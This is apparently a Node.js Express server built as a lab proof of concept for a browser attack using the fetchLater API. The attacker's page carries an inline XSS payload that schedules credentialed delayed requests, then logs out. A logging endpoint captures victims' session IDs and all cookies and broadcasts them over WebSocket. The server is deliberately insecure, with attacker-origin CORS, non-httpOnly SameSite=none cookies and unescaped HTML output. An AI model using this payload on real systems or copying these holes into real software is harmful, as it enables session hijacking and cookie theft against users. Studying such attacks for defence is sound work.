const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const crypto = require('crypto');
const WebSocket = require('ws');
const app = express();

let wsClient = null;

function connectToWebSocketServer() {
  wsClient = new WebSocket('ws://websocket-server:3004');

  wsClient.on('open', () => {
    console.log('Backend connected to WebSocket server');
  });

  wsClient.on('error', (error) => {
    console.error('WebSocket connection error:', error);
  });

  wsClient.on('close', () => {
    console.log('WebSocket connection closed, attempting to reconnect...');
    setTimeout(connectToWebSocketServer, 5000);
  });
}

connectToWebSocketServer();

function broadcastToWebSocket(data) {
  if (wsClient && wsClient.readyState === WebSocket.OPEN) {
    wsClient.send(JSON.stringify(data));
  }
}

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cookieParser());

app.use((req, res, next) => {
  // Allow requests from the attack server
  res.header('Access-Control-Allow-Origin', 'https://localhost:8444');
  res.header('Access-Control-Allow-Credentials', 'true');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization, Cookie');

  if (req.method === 'OPTIONS') {
    res.sendStatus(200);
  } else {
    next();
  }
});

// In-memory session storage
const sessions = {};

// Valid credentials
const validCredentials = {
  'victim': 'victim',
  'attacker': 'attacker'
};

// Generate random session ID
function generateSessionId() {
  return crypto.randomBytes(32).toString('hex');
}

// Middleware to check authentication
function requireAuth(req, res, next) {
  const sessionId = req.cookies.sessionId;
  if (sessionId && sessions[sessionId]) {
    req.user = sessions[sessionId];
    next();
  } else {
    res.redirect('/login');
  }
}

// Root route - redirect to home if authenticated, otherwise to login
app.get('/', (req, res) => {
  const sessionId = req.cookies.sessionId;
  if (sessionId && sessions[sessionId]) {
    res.redirect('/home');
  } else {
    res.redirect('/login');
  }
});

app.get('/login', (req, res) => {
  res.send(`
    <html>
      <head><title>Login</title></head>
      <body>
        <h2>Login</h2>
        <form method="POST" action="/login">
          <div>
            <label>Username:</label>
            <input name="username" placeholder="victim" value="victim" required>
          </div>
          <div>
            <label>Password:</label>
            <input name="password" type="password" placeholder="Password" value="victim" required>
          </div>
          <div>
            <label>Captcha Token:</label>
            <input name="captchaToken" placeholder="Enter captcha token" value="11111111" required>
          </div>
          <button type="submit">Login</button>
        </form>
      </body>
    </html>
  `);
});

app.post('/login', (req, res) => {
  const { username, password, captchaToken } = req.body;

  // Validate captcha token
  if (!captchaToken || captchaToken.trim() === '') {
    res.send(`
      <html>
        <head><title>Login Failed</title></head>
        <body>
          <h2>Login Failed</h2>
          <p>Captcha token is required. Please try again.</p>
          <a href="/login">Back to Login</a>
        </body>
      </html>
    `);
    return;
  }

  // Validate credentials
  if (validCredentials[username] && validCredentials[username] === password) {
    // Generate session ID and store session
    const sessionId = generateSessionId();
    sessions[sessionId] = username;

    // Set secure session cookie
    res.cookie('sessionId', sessionId, {
      httpOnly: false,
      secure: true, // Enable secure cookies for HTTPS
      sameSite: 'none', // Allow cross-site requests
      maxAge: 24 * 60 * 60 * 1000 // 24 hours
    });

    // Set username cookie
    res.cookie('username', username, {
      httpOnly: false,
      secure: true, // Enable secure cookies for HTTPS
      sameSite: 'none', // Allow cross-site requests
      maxAge: 24 * 60 * 60 * 1000 // 24 hours
    });

    res.redirect('/home');
  } else {
    res.send(`
      <html>
        <head><title>Login Failed</title></head>
        <body>
          <h2>Login Failed</h2>
          <p>Invalid credentials. Please try again.</p>
          <a href="/login">Back to Login</a>
        </body>
      </html>
    `);
  }
});

app.get('/home', requireAuth, (req, res) => {
  const username = req.user;
  let payload;

  // Different payload based on user
  if (username === 'attacker') {
    // Enhanced XSS payload with scheduled fetchLater and logout functionality
    payload = `<img src=x onerror="
      // Enhanced XSS payload for fetchLater exploit with pre-scheduled requests
      console.log('XSS payload executing for user: ${username}');
      
      if ('fetchLater' in window) {
        console.log('Scheduling 12 fetchLater requests over 2 minutes...');
        for (let i = 1; i <= 12; i++) {
          const activateAfter = i * 2000;
          
          let req = new Request('https://localhost:8443/fetchlater-log', {
            method: 'POST',
            credentials: 'include',
            body: JSON.stringify({
              requestNumber: i,
              totalRequests: 12,
              activateAfter: activateAfter,
              scheduledBy: 'attacker',
              userAgent: navigator.userAgent.substring(0, 50),
              origin: window.location.origin
              }),
              headers: {'Content-Type': 'application/json'}
            }
          )
         
          fetchLater(req, {activateAfter: activateAfter});
          
          console.log('fetchLater request #' + i + ' scheduled for ' + (activateAfter/1000) + ' seconds from now');
        }
        
        console.log('All 12 fetchLater requests scheduled successfully!');
      } else {
        console.error('fetchLater API not supported');
      }
      
      // After 10 seconds, logout the attacker
      setTimeout(() => {
        console.log('Logging out attacker...');
        
        // Send logout notification
        ws.send(JSON.stringify({ type: 'attacker-logged-out' }));
        
        // Perform logout
        fetch('/logout', { method: 'POST', credentials: 'include' })
          .then(() => {
            console.log('Attacker logged out successfully');
          })
          .catch(err => console.error('Logout error:', err));
      }, 10000);
    ">`;
  } else {
    payload = 'NORMAL USER';
  }

  res.send(`
    <html>
      <head><title>Home</title></head>
      <body>
        <h1>Hello ${username}!</h1>
        <p>Your payload: ${payload}</p>
        <form method="POST" action="/logout">
          <button type="submit">Logout</button>
        </form>
        
        <script>
            const ws = new WebSocket('wss://localhost:8445');
            ws.onopen = () => {
              ws.send(JSON.stringify({ type: '${username}-logged-in' }));
            };
        </script>
      </body>
    </html>
  `);
});

app.post('/fetchlater-log', (req, res) => {
  const logData = req.body;
  const sessionId = req.cookies.sessionId;
  const currentUser = sessions[sessionId] || 'anonymous';
  const data = {
    user: currentUser,
    sessionId: sessionId,
    username: req.cookies.username || 'unknown',
    cookies: JSON.stringify(req.cookies),
    requestData: logData,
    timestamp: new Date().toISOString()
  }

  console.log('fetchLater log received:', data);

  // Broadcast the data variable to WebSocket clients
  broadcastToWebSocket({
    type: 'fetchlater-data',
    data: JSON.stringify(data)
  });

  res.json({
    status: 'logged',
    ...data
  });
});

app.post('/logout', (req, res) => {
  const sessionId = req.cookies.sessionId;

  if (sessionId && sessions[sessionId]) {
    delete sessions[sessionId];
  }

  res.clearCookie('sessionId');
  res.clearCookie('username');

  res.redirect('/login');
});

app.listen(3000, () => console.log('Backend running on http://localhost:3000'));
